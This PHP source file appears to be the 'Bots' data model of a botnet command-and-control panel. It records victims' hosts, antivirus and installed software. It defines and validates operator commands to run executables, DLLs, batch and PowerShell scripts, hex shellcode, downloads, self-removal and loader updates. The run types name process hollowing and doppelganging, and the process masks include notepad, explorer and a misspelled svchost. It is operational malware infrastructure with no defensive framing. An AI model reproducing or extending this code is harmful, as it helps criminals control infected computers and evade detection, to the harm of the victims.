<?php

namespace common\models;

use Yii;

/**
 * This is the model class for table "bots".
 *
 * @property int $id
 * @property string $bot
 * @property string $country
 * @property string $arch
 * @property string $cname
 * @property string $path
 * @property string $uname
 * @property string $comps
 * @property string $av
 * @property string $group
 * @property resource $trust
 * @property resource $net
 * @property resource $domain
 * @property string $soft
 * @property int $status
 * @property string $created_at
 * @property string $updated_at
 * @property string $ip
 * @property string $locale
 * @property int $tz
 * @property string $ps
 * @property string $source
 * @property string $comment
 * @property string $os
 */
class Bots extends \yii\db\ActiveRecord
{
    public $lastcommand;
    public $file;

    public $avt;
    public $softt;
    public $pst;

    public $target;

    public $field0;
    public $field1;
    public $field2;
    public $field3;
    public $field4;
    public $field5;
    public $field6;
    public $field7;

    /**
     * {@inheritdoc}
     */
    public static function tableName()
    {
        return 'bots';
    }

    /**
     * {@inheritdoc}
     */
    public function rules()
    {
        return [
            [['bot'], 'required'],
            [['path', 'uname', 'comps', 'av', 'group', 'trust', 'net', 'soft', 'ip', 'locale', 'ps', 'source', 'comment', 'osbuild', 'cpu', 'drive', 'motherboard', 'memory', 'vm', 'sb'], 'string'],
            [['status'], 'default', 'value' => null],
            [['priority'], 'default', 'value' => 1],
            [['status', 'busy', 'type'], 'integer', 'max' => 3],
            [['priority'], 'integer', 'max' => 32],
            [['id', 'autoupdate'],'integer','max'=>2147483647],
            [['created_at', 'updated_at', 'update_start'], 'safe'],
            [['bot', 'cname', 'domain'], 'string', 'max' => 255],
            [['country', 'arch', 'tz'], 'string', 'max' => 2],
            [['file'], 'safe'],
            [['file'], 'file', 'extensions'=>'exe, dll'],
            [['avt', 'softt', 'pst', 'lastcommand', 'os', 'field0', 'field1', 'field2', 'field3', 'field4', 'field5', 'field6', 'field7', 'target'], 'string'],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function attributeLabels()
    {
        return [
            'id' => 'ID',
            'bot' => 'Bot',
            'country' => 'Country',
            'arch' => 'Arch',
            'cname' => 'Hostname',
            'path' => 'Path',
            'uname' => 'Uname',
            'comps' => 'Comps',
            'av' => 'Av',
            'group' => 'Group',
            'trust' => 'Trust',
            'net' => 'Net',
            'domain' => 'Domain',
            'soft' => 'Soft',
            'status' => 'Status',
            'created_at' => 'First activity',
            'updated_at' => 'Last activity',
            'ip' => 'Ip',
            'locale' => 'Locale',
            'tz' => 'Tz',
            'ps' => 'Ps',
            'source' => 'Source',
            'os' => 'Os',
            'osbuild' => 'Osbuild',
            'comment' => 'Comment',
            'busy' => 'Busy',
            'type' => 'Type',
            'autoupdate' => 'Autoupdate',
        ];
    }

    public function getId()
    {
        return $this->getPrimaryKey();
    }

    
    public static function findByBot($bot)
    {
        return static::findOne(['bot' => $bot]);
    }

    public static function findByBotName($botname)
    {
        $s = static::findOne(['bot' => $botname]);
        if(isset($s)){
            return static::findOne(['bot' => $botname])['id'];
        }else{
            return null;
        }
        
    }

    public function getCommands()
    {
        return $this->hasMany(Commands::className(), ['bot_id' => 'id']);
    }

    public function parseOS($o)
    {
        $default = [
            'ver' => 'Unrecognized Windows version',
            'build' => 'XXXX',
            'pn' => 'XX',
            'pic' => '2000.jpg',
        ];

        if(!isset($o)){
            return $default;
        };

        $os = json_decode($o, true);
        
        if(gettype($os)!='array'){
            return $default;
        }

        if(count($os) < 3){
            return $default;
        };

        $key = $os[1];

        $windowsVersion = [
            'S100' => ['version' => 'Windows Server 2016', 'logo' => 'server.jpg'],
            'S63' => ['version' => 'Windows Server 2012 R2', 'logo' => 'server.jpg'],
            'S62' => ['version' => 'Windows Server 2012', 'logo' => 'server.jpg'],
            'S61' => ['version' => 'Windows Server 2008 R2', 'logo' => 'server.jpg'],
            'S60' => ['version' => 'Windows Server 2008', 'logo' => 'server.jpg'],
            'S52' => ['version' => 'Windows Server 2003', 'logo' => 'server.jpg'],
            'W100' => ['version' => 'Windows 10', 'logo' => '10.jpg'],
            'W63' => ['version' => 'Windows 8.1', 'logo' => '8.jpg'],
            'W62' => ['version' => 'Windows 8', 'logo' => '8.jpg'],
            'W61' => ['version' => 'Windows 7', 'logo' => '7.jpg'],
            'W60' => ['version' => 'Windows Vista', 'logo' => 'vista.jpg'],
            'W52' => ['version' => 'Windows XP 64-Bit Edition', 'logo' => 'xp.jpg'],
            'W51' => ['version' => 'Windows XP', 'logo' => 'xp.jpg'],
            'W50' => ['version' => 'Windows 2000', 'logo' => '2000.jpg'],
            
        ];

        if(array_key_exists($key,$windowsVersion)){

            return [
                'ver' => $windowsVersion[$key]['version'],
                'build' => (isset($os[2])) ? $os[2] : 'XXXX',
                'pn' => (isset($os[3])) ? $os[3] : 'XX',
                'pic' => $windowsVersion[$key]['logo'],
            ];
        }else{
            return $default;
        }
    }

    public static function CommandsList($c,$s = 0)
    {
        // s = 0 get volume s = 1 get key
        $commandlist = [
            'nop'=>'0', 
            'getinfo'=>'1',
            'runexe'=>'10',
            'rundll'=>'11',
            'runbat'=>'12',
            'runpws'=>'13',
            'reset'=>'14',
            'runcode'=>'17',
            'terminate'=>'15',
            'download'=>'16',
            'suicide'=>'100',
            'updateloader32'=>'1001',
            'updateloader64'=>'1002',
            'updatebot32'=>'1003',
            'updatebot64'=>'1004',
            'updatenow'=>'10',
        ];
        if(!isset($commandlist[$c])){
            return false;
        }
        return ($s == 0) ? $commandlist[$c] : array_search($c, $commandlist);
    }

    public static function RuntypeList($c,$s = 0)
    {
        // s = 0 get volume s = 1 get key
        $runtype = [
            'create' => '1',
            'hollowing' => '2',
            'dopple' => '3',
            'channel' => '1',
            'dump' => '2',
            'update' => '4',
        ];
        if(!isset($runtype[$c])){
            return false;
        }
        
        return ($s == 0) ? $runtype[$c] : array_search($c, $runtype);
    }

    public static function MaskList($c,$s = 0)
    {
        // s = 0 get volume s = 1 get key
        $mask = [
            'notuse' => '0',
            'notepad' => '1',
            'explorer' => '2',
            'scvhost' => '3',
            'cmd' => '4',
        ];
        if(!isset($mask[$c])){
            return false;
        }
        return ($s == 0) ? $mask[$c] : array_search($c, $mask);
    }

    public function reparse($c)
    {
        //return $c;

        $r = explode(' ', $c); // parse all
        $scr = substr($c,strpos($c, '\r\n')+4); // get script source
        $scp = substr($c,0,strpos($c, '\r\n')); // get rest of command 12,13
        $scc = substr($c,strpos($c, 'runcode '));
        //print_r($scp);die();
        
        $field = [Bots::CommandsList($r[0],1),'','','','','','',''];
        switch ($r[0]) {
            case '0': // nop +
                $field[2] = $r[1];
                break;
            case '1': // getsysinfo +
                $field[2] = isset($r[1]) ? $r[1] : '';
                break;
            case '10': // runexe +
                if($r[1]=='4'){ // force update
                    $field[0] = 'updatenow';
                    $field[1] = 'update';
                    if(isset($r[2])){
                        $field[4] = Clones::getSourceByClone($r[2]);
                        $field[7] = Files::getFilenameByStoredfilename($field[4]);
                    }
                    
                }else{ // all other
                    $p = ''; // get file parameters right from filename
                    for($i=5;$i<count($r);$i++){
                        $p .= ' '.$r[$i];
                    }
                    $field[1] = Bots::RuntypeList($r[1],1);
                    $field[2] = isset($r[2]) ? $r[2] : '';
                    $field[3] = Bots::MaskList($r[3],1);
                    $field[4] = Clones::getSourceByClone($r[4]);
                    $field[5] = $p;
                    $field[7] = Files::getFilenameByStoredfilename($field[4]);
                }
                break;
            case '11': // rundll +
                $p = '';
                for($i=3;$i<count($r);$i++){
                    $p .= ' '.$r[$i];
                }
                $field[2] = isset($r[1]) ? $r[1] : '';
                $field[4] = Clones::getSourceByClone($r[2]);
                $field[5] = $p;
                $field[7] = Files::getFilenameByStoredfilename($field[4]);
                break;
            case '12':
                
                    $pr = explode(' ', $scp);
                    //print_r($c);die();
                    $p = '';
                    for($i=3;$i<count($pr);$i++){
                        $p .= ' '.$pr[$i];
                    }
                    $field[1] = ($r[1]==1) ? 'channel' : 'dump';
                    $field[2] = isset($r[2]) ? $r[2] : '';
                    $field[5] = $p;
                    $field[6] = str_replace('\t',"tabtab847264y",str_replace("\\","slashslash743io",str_replace("'", "singlequotevk1zyS5", $scr)));
                
                break;


            case '13': // runpws +  13 1 60 \r\ncd c:\temp\r\ndir\r\n
            // scr - cd c:\temp\r\ndir\r\n 
            // scp - 13 1 60 
                //print_r($scr);die();
                    $pr = explode(' ', $scp);
                    $p = '';
                    for($i=3;$i<count($pr);$i++){
                        $p .= ' '.$pr[$i];
                    }
                    $field[1] = ($r[1]==1) ? 'channel' : 'dump';
                    $field[2] = isset($r[2]) ? $r[2] : '';
                    $field[5] = $p;
                    $field[6] = str_replace('\t',"tabtab847264y",str_replace("\\","slashslash743io",str_replace("'", "singlequotevk1zyS5", $scr)));
                    //$field[6] = $scr;
                
                break;
            case '14': // reset+
                break;
            case '15': // terminate+
                $field[5] = isset($r[1]) ? $r[1] : '';
                break;
            case '16': // download+
                $field[5] = isset($r[1]) ? $r[1] : '';
                break;
            case '17': // runcode+
                $field[6] = $scc;
                break;
            case '100': // runcode+
                break;

            case '1001': // 
                if(isset($r[1])){
                    $field[4] = isset($r[1]) ? $r[1] : '';
                    $field[5] = isset($r[2]) ? $r[2] : '';
                    $field[7] = Files::getFilenameByStoredfilename($r[1]);
                }
                break;
            case '1002': // 
                if(isset($r[1])){
                    $field[4] = isset($r[1]) ? $r[1] : '';
                    $field[5] = isset($r[2]) ? $r[2] : '';
                    $field[7] = Files::getFilenameByStoredfilename($r[1]);
                }
                break;

            case '1003': // 
                if(isset($r[1])){
                    $field[4] = isset($r[1]) ? $r[1] : '';
                    $field[5] = isset($r[2]) ? $r[2] : '';
                    $field[7] = Files::getFilenameByStoredfilename($r[1]);
                }
                break;

            case '1004': // 
                if(isset($r[1])){
                    $field[4] = isset($r[1]) ? $r[1] : '';
                    $field[5] = isset($r[2]) ? $r[2] : '';
                    $field[7] = Files::getFilenameByStoredfilename($r[1]);
                }
                break;

            default:
                # code...
                break;
        }
        foreach ($field as $key => $value) {
            $field[$key] = trim($field[$key]);
        }
        return json_encode($field);
    }

    public static function botValidate($s)
    {
        return (preg_match('/^[0-9]{40}$/', $s)==1 || preg_match('~(?=.*[0-9])(?=.*[A-z])^[A-z0-9]{32}$~', $s)==1) ? true : false;
        
    }

    public function isBusy($model)
    {
        // is busy
        $s = Bots::findByBot($model->bot);
        if($s->busy==1 && $model->field0!='reset' && $model->field0!='suicide'){
            return false;
        }
    }

    public function botCommandValidate($model)
    {
        

        // wrong command
        if(Bots::CommandsList($model->field0,0)===false){
            return false;
        }


         // wrong code
        if($model->field0=='runcode'){
            $pm = trim(str_replace(' ','',str_replace('0x', '', $model->field6)));
            $pm = str_replace(chr(13), '', $pm);
            $pm = str_replace(chr(10), '', $pm);
            //print_r(preg_match("/^[a-f0-9]*$/", $pm));die();    
            if(preg_match("/^[A-Fa-f0-9]*$/", $pm)){
                return true;
            }else{
                return false;
            }
        }


        // wrong runtype
        if($model->field0=='runexe' || $model->field0=='update' || $model->field0=='runbat' || $model->field0=='runpws'){
            if(Bots::RuntypeList($model->field1,0)===false){
                return false;
            }else{
                return true;
            }
        }else{
            if($model->field1==''){
                return true;
            }else{
                return false;
            }
        }

        // wrong timeout
        if($model->field0=='nop' || $model->field0=='getinfo' || $model->field0=='runexe' || $model->field0=='rundll' || $model->field0=='runbat' || $model->field0=='runpws'){
            if(is_numeric($model->field2)){
                return true;
            }else{
                return false;
            }
        }else{
            if($model->field2==''){
                return true;
            }else{
                return false;
            }
        }

        // wrong mask
        if($model->field0=='runexe'){
            if(Bots::MaskList($model->field3,0)===false){
                return false;
            }else{
                return true;
            }
        }else{
            if($model->field3==''){
                return true;
            }else{
                return false;
            }
        } 

        // wrong file
        if($model->field0=='runexe' || $model->field0=='rundll' || $model->field0=='updateloader32' || $model->field0=='updateloader64' || $model->field0=='updatebot32' || $model->field0=='updatebot64' || $model->field0=='updatenow'){
            if(file_exists(Yii::getAlias('@absPath').$model->field4)===false){
                return false;
            }else{
                return true;
            }
        }else{
            if($model->field4==''){
                return true;
            }else{
                return false;
            }
        }

        // other controlled by bot


        //print_r(Bots::CommandsList($model->field0,0));die();
        return true;

    }

}
